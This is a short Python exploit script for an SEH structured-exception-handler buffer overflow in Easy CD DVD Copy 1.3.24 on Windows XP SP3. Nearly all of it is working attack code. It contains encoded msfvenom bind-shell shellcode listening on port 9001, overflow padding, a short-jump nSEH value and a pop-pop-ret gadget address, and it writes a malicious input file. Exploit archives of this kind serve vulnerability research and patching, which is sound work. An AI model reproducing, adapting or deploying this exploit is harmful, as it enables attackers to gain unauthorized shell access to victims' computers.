# Exploit for Easy CD DVD Copy 1.3.24 - SEH
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.txt", "wb")
	
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xbe\xb6\x74\xcd\xec\xda\xd5\xd9\x74\x24"
shellcode_bind += b"\xf4\x5d\x2b\xc9\xb1\x53\x31\x75\x12\x83"
shellcode_bind += b"\xed\xfc\x03\xc3\x7a\x2f\x19\xd7\x6b\x2d"
shellcode_bind += b"\xe2\x27\x6c\x52\x6a\xc2\x5d\x52\x08\x87"
shellcode_bind += b"\xce\x62\x5a\xc5\xe2\x09\x0e\xfd\x71\x7f"
shellcode_bind += b"\x87\xf2\x32\xca\xf1\x3d\xc2\x67\xc1\x5c"
shellcode_bind += b"\x40\x7a\x16\xbe\x79\xb5\x6b\xbf\xbe\xa8"
shellcode_bind += b"\x86\xed\x17\xa6\x35\x01\x13\xf2\x85\xaa"
shellcode_bind += b"\x6f\x12\x8e\x4f\x27\x15\xbf\xde\x33\x4c"
shellcode_bind += b"\x1f\xe1\x90\xe4\x16\xf9\xf5\xc1\xe1\x72"
shellcode_bind += b"\xcd\xbe\xf3\x52\x1f\x3e\x5f\x9b\xaf\xcd"
shellcode_bind += b"\xa1\xdc\x08\x2e\xd4\x14\x6b\xd3\xef\xe3"
shellcode_bind += b"\x11\x0f\x65\xf7\xb2\xc4\xdd\xd3\x43\x08"
shellcode_bind += b"\xbb\x90\x48\xe5\xcf\xfe\x4c\xf8\x1c\x75"
shellcode_bind += b"\x68\x71\xa3\x59\xf8\xc1\x80\x7d\xa0\x92"
shellcode_bind += b"\xa9\x24\x0c\x74\xd5\x36\xef\x29\x73\x3d"
shellcode_bind += b"\x02\x3d\x0e\x1c\x4b\xf2\x23\x9e\x8b\x9c"
shellcode_bind += b"\x34\xed\xb9\x03\xef\x79\xf2\xcc\x29\x7e"
shellcode_bind += b"\xf5\xe6\x8e\x10\x08\x09\xef\x39\xcf\x5d"
shellcode_bind += b"\xbf\x51\xe6\xdd\x54\xa1\x07\x08\xc0\xa9"
shellcode_bind += b"\xae\xe3\xf7\x54\x10\x54\xb8\xf6\xf9\xbe"
shellcode_bind += b"\x37\x29\x19\xc1\x9d\x42\xb2\x3c\x1e\x4f"
shellcode_bind += b"\x6a\xc8\xf8\xe5\x7c\x9c\x53\x91\xbe\xfb"
shellcode_bind += b"\x6b\x06\xc0\x29\xc4\xa0\x89\x3b\xd3\xcf"
shellcode_bind += b"\x09\x6e\x73\x47\x82\x7d\x47\x76\x95\xab"
shellcode_bind += b"\xef\xef\x02\x21\x7e\x42\xb2\x36\xab\x34"
shellcode_bind += b"\x57\xa4\x30\xc4\x1e\xd5\xee\x93\x77\x2b"
shellcode_bind += b"\xe7\x71\x6a\x12\x51\x67\x77\xc2\x9a\x23"
shellcode_bind += b"\xac\x37\x24\xaa\x21\x03\x02\xbc\xff\x8c"
shellcode_bind += b"\x0e\xe8\xaf\xda\xd8\x46\x16\xb5\xaa\x30"
shellcode_bind += b"\xc0\x6a\x65\xd4\x95\x40\xb6\xa2\x99\x8c"
shellcode_bind += b"\x40\x4a\x2b\x79\x15\x75\x84\xed\x91\x0e"
shellcode_bind += b"\xf8\x8d\x5e\xc5\xb8\xae\xbc\xcf\xb4\x46"
shellcode_bind += b"\x19\x9a\x74\x0b\x9a\x71\xba\x32\x19\x73"
shellcode_bind += b"\x43\xc1\x01\xf6\x46\x8d\x85\xeb\x3a\x9e"
shellcode_bind += b"\x63\x0b\xe8\x9f\xa1"

junk = "A" * 996
nseh = "\xeb\x14\x90\x90"
seh  = "\x59\x78\x03\x10"   # 0x10037859 : pop ebx # pop eax # ret SkinMagic.dll
nops = "\x90" * 30
junk2 = "D" * (5000-len(junk+nseh+seh+shellcode_bind+nops))

buffer = junk + nseh + seh + nops + shellcode_bind + junk2
	
file.write(buffer)
file.close()
